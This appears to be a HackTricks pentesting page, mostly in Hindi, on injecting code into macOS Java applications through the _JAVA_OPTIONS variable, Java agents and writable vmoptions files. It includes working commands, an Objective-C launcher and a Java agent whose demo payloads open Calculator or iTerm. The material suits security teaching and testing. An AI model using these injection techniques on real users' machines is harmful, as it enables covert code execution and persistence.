# macOS Java Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Enumeration

अपने सिस्टम में स्थापित Java अनुप्रयोगों को खोजें। यह देखा गया कि **Info.plist** में Java ऐप्स कुछ जावा पैरामीटर शामिल करेंगे जिनमें स्ट्रिंग **`java.`** होगी, इसलिए आप इसके लिए खोज सकते हैं:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

env वेरिएबल **`_JAVA_OPTIONS`** का उपयोग java संकलित ऐप के निष्पादन में मनमाने java पैरामीटर को इंजेक्ट करने के लिए किया जा सकता है:
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
इसे एक नए प्रोसेस के रूप में चलाने के लिए और वर्तमान टर्मिनल के बच्चे के रूप में नहीं, आप उपयोग कर सकते हैं:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
हालांकि, यह निष्पादित ऐप पर एक त्रुटि को ट्रिगर करेगा, एक और अधिक छिपा हुआ तरीका एक जावा एजेंट बनाने और उपयोग करने का है:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
> [!CAUTION]
> एजेंट को **विभिन्न Java संस्करण** के साथ बनाना एजेंट और एप्लिकेशन दोनों के निष्पादन को क्रैश कर सकता है

जहाँ एजेंट हो सकता है:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
एजेंट को संकलित करने के लिए चलाएँ:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
`manifest.txt` के साथ:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
और फिर env वेरिएबल को एक्सपोर्ट करें और java एप्लिकेशन को इस तरह चलाएँ:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions फ़ाइल

यह फ़ाइल **Java params** के विनिर्देशन का समर्थन करती है जब Java निष्पादित होता है। आप कुछ पिछले ट्रिक्स का उपयोग करके java params को बदल सकते हैं और **प्रक्रिया को मनमाने आदेश निष्पादित करने** के लिए बना सकते हैं।\
इसके अलावा, यह फ़ाइल `include` निर्देशिका के साथ **अन्य फ़ाइलों को भी शामिल** कर सकती है, इसलिए आप एक शामिल फ़ाइल को भी बदल सकते हैं।

और भी, कुछ Java ऐप्स **एक से अधिक `vmoptions`** फ़ाइलें **लोड** करेंगे।

कुछ अनुप्रयोग जैसे Android Studio अपने **आउटपुट में यह संकेत करते हैं कि वे इन फ़ाइलों के लिए कहाँ देख रहे हैं**, जैसे:
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
यदि वे ऐसा नहीं करते हैं, तो आप इसे आसानी से जांच सकते हैं:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
ध्यान दें कि इस उदाहरण में Android Studio फ़ाइल **`/Applications/Android Studio.app.vmoptions`** लोड करने की कोशिश कर रहा है, जो एक ऐसा स्थान है जहाँ **`admin` समूह** का कोई भी उपयोगकर्ता लिखने की अनुमति रखता है। 

{{#include ../../../banners/hacktricks-training.md}}
